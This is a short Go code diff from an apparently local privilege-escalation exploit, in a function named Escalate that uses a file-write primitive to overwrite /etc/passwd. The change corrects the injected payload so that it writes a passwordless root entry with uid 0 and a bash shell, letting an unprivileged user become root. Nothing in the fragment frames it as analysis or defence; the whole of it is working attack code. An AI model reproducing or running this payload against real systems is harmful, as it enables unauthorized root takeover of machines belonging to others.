@@ -7,7 +7,7 @@ func Escalate(primitive Primitive) (err error) {
 	if err != nil {
 		return
 	}
-	payload := []byte(":0:0:root:/root:/bin/bash\n")
+	payload := []byte("::0:0:root:/root:/bin/bash\n")
 	err = primitive.Write("/etc/passwd", int64(offset), payload)
 	if err != nil {
 		return
